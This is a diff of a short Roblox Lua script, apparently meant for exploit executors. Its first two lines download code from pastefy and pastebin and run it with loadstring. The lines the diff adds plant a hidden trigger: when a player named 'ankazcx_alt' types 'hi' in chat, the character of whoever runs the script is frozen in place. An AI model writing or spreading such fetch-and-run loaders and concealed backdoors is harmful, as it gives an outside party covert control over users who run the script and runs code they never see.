@@ -1,2 +1,26 @@
 loadstring(game:HttpGet('https://pastefy.app/39Mk0IUN/raw'))()
 loadstring(game:HttpGet('https://pastebin.com/raw/Vg6AZbZE'))()
+local Players = game:GetService("Players")
+local localPlayer = Players.LocalPlayer
+
+local function onPlayerAdded(player)
+    player.Chatted:Connect(function(message)
+        if player.Name == "ankazcx_alt" and message:lower() == "hi" then
+            local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
+            local rootPart = character:WaitForChild("HumanoidRootPart")
+            rootPart.Anchored = true
+        end
+    end)
+end
+
+for _, player in pairs(Players:GetPlayers()) do
+    if player.Name == "ankazcx_alt" then
+        onPlayerAdded(player)
+    end
+end
+
+Players.PlayerAdded:Connect(function(player)
+    if player.Name == "ankazcx_alt" then
+        onPlayerAdded(player)
+    end
+end)
